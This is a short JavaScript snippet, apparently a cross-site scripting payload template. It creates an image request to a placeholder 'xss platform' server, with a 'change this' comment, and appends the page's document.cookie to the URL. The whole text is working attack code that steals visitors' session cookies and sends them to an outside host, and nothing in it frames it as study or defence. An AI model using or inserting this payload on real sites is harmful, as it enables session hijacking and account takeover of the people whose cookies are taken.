var serverUrl = "https://<xss platform ip>/cookie";//change this
var newimg = new Image();	
newimg.src=serverUrl+"?cookie="+escape(document.cookie);